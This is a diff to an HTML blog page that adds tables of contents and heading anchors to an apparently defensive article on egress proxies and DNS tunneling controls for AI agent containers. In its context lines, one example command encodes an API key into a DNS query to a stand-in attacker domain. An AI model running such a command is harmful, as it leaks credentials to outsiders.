@@ -104,6 +104,16 @@
           </div>
 
           <div class="article-body">
+            <details class="mobile-toc">
+              <summary><i class="fa-solid fa-list-ol"></i> Table of Contents</summary>
+              <ul class="mobile-toc-list">
+                <li><a href="#the-threat-of-covert-exfiltration-channels">The Threat of Covert Exfiltration Channels</a></li>
+                <li><a href="#1-under-the-hood-outbound-proxy-architectures">1. Under the Hood: Outbound Proxy Architectures</a></li>
+                <li><a href="#2-implementing-safety-restrictions">2. Implementing Safety Restrictions</a></li>
+                <li><a href="#code-demo-egress-proxy-validator">Code Demo: Egress Proxy Validator</a></li>
+                <li><a href="#egress-optimization-takeaways">Egress Optimization Takeaways</a></li>
+              </ul>
+            </details>
 <div class="alert alert-note">
   <div class="alert-title"><i class="fa-solid fa-info-circle"></i> Note</div>
   <div class="alert-content"><p><strong>📖 Article Overview</strong>
@@ -111,7 +121,7 @@ If an autonomous code daemon is compromised via prompt injection, the attacker&#
 </div>
 </div>
 <hr>
-<h2>The Threat of Covert Exfiltration Channels</h2>
+<h2 id="the-threat-of-covert-exfiltration-channels">The Threat of Covert Exfiltration Channels</h2>
 <p>Even inside a sandbox environment, outbound network controls can be bypassed:</p>
 <ul>
 <li><strong>The DNS Tunneling Exploit</strong>: Since containers need DNS lookup access to resolve dependencies, attackers encode sensitive data inside subdomain queries (e.g. <code>dig &lt;base64_api_key&gt;.attacker.com</code>). The database server forwards the query, allowing the attacker to capture the data.</li>
@@ -131,21 +141,21 @@ flowchart TD
     
     DomainCheck --&gt;|Yes| Route[Forward Clean Request]</div>
 <hr>
-<h2>1. Under the Hood: Outbound Proxy Architectures</h2>
+<h2 id="1-under-the-hood-outbound-proxy-architectures">1. Under the Hood: Outbound Proxy Architectures</h2>
 <p>To secure outbound container communication:</p>
 <ul>
 <li><strong>HTTP/HTTPS Egress Proxying</strong>: Route all container outbound traffic through a proxy (e.g., Squid or Envoy) that validates HTTP headers, target domains, and certificate validity.</li>
 <li><strong>DNS Resolution Firewalls</strong>: Restrict container resolver configurations to trusted internal DNS servers that block queries to untrusted or newly registered domains.</li>
 </ul>
 <hr>
-<h2>2. Implementing Safety Restrictions</h2>
+<h2 id="2-implementing-safety-restrictions">2. Implementing Safety Restrictions</h2>
 <p>Configure your egress proxy gates with these rules:</p>
 <ol>
 <li><strong>Strict Whitelisting</strong>: Disable all outbound traffic by default. Explicitly whitelist only the specific domains required for the agent&#39;s tasks (e.g. <code>api.github.com</code>).</li>
 <li><strong>DNS Query Length Limits</strong>: Block DNS queries where the subdomain length exceeds 64 characters, as this is a common indicator of DNS tunneling.</li>
 </ol>
 <hr>
-<h2>Code Demo: Egress Proxy Validator</h2>
+<h2 id="code-demo-egress-proxy-validator">Code Demo: Egress Proxy Validator</h2>
 <p>Below is a Python implementation of an egress proxy checker. It intercepts outbound connection requests, validates domain whitelists, scans for DNS tunneling patterns, and blocks unauthorized egress calls.</p>
 <pre><code class="language-python">import re
 from typing import Dict, Any, Tuple
@@ -201,7 +211,7 @@ if __name__ == &quot;__main__&quot;:
     status_dns, log_dns = proxy.validate_dns_query(dns_tunnel)
     print(f&quot;[DNS]  Target: {dns_tunnel} | Status: {status_dns} | Log: {log_dns}&quot;)</code></pre>
 <hr>
-<h2>Egress Optimization Takeaways</h2>
+<h2 id="egress-optimization-takeaways">Egress Optimization Takeaways</h2>
 <ul>
 <li><strong>Default to Block</strong>: Block all outbound network traffic from your agent container by default.</li>
 <li><strong>Scan for DNS Tunneling</strong>: Monitor DNS query sizes and block lookups with excessively long subdomains.</li>
@@ -234,6 +244,18 @@ if __name__ == &quot;__main__&quot;:
       </div>
 
       <aside class="blog-sidebar">
+        <div class="sidebar-card article-toc-card" id="article-toc-container">
+          <h4><i class="fa-solid fa-bars-staggered"></i> Table of Contents</h4>
+          <nav class="article-toc">
+            <ul class="toc-list">
+              <li class="toc-item toc-h2"><a href="#the-threat-of-covert-exfiltration-channels" class="toc-link">The Threat of Covert Exfiltration Channels</a></li>
+              <li class="toc-item toc-h2"><a href="#1-under-the-hood-outbound-proxy-architectures" class="toc-link">1. Under the Hood: Outbound Proxy Architectures</a></li>
+              <li class="toc-item toc-h2"><a href="#2-implementing-safety-restrictions" class="toc-link">2. Implementing Safety Restrictions</a></li>
+              <li class="toc-item toc-h2"><a href="#code-demo-egress-proxy-validator" class="toc-link">Code Demo: Egress Proxy Validator</a></li>
+              <li class="toc-item toc-h2"><a href="#egress-optimization-takeaways" class="toc-link">Egress Optimization Takeaways</a></li>
+            </ul>
+          </nav>
+        </div>
         <div class="sidebar-card">
           <h4><i class="fa-solid fa-list"></i> Latest Articles</h4>
           <ul class="sidebar-post-list">
